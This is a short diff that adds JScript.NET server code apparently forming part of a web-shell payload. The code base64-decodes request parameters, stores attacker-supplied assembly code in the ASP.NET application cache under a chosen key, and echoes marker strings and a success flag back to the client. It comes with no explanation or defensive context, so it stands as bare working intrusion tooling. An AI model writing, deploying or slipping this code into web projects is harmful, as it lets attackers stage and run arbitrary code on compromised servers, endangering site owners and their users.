@@ -1,0 +1,24 @@
+function DEC(d){return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(d));}
+function ENC(d){return Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(d));}
+var pp=DEC(Request.Item['argument1']);
+var ss=DEC(Request.Item['argument2']);
+Response.Write(pp);
+try{
+    var CachePtr = "CACHE";
+    var hashtable = Application[CachePtr];
+    if(hashtable == null)
+    {
+            hashtable = new System.Collections.Hashtable();
+    }
+    var SET_ASS_SUCCESS = "1";
+    var hash=DEC(Request.Item['argument3']);
+    var assCode=DEC(Request.Item['argument4']);
+    hashtable[hash] = assCode;
+    Application[CachePtr] = hashtable;
+    Response.Write(ENC(SET_ASS_SUCCESS));
+}
+catch(e)
+{
+	Response.Write(e);
+}
+Response.Write(ss);
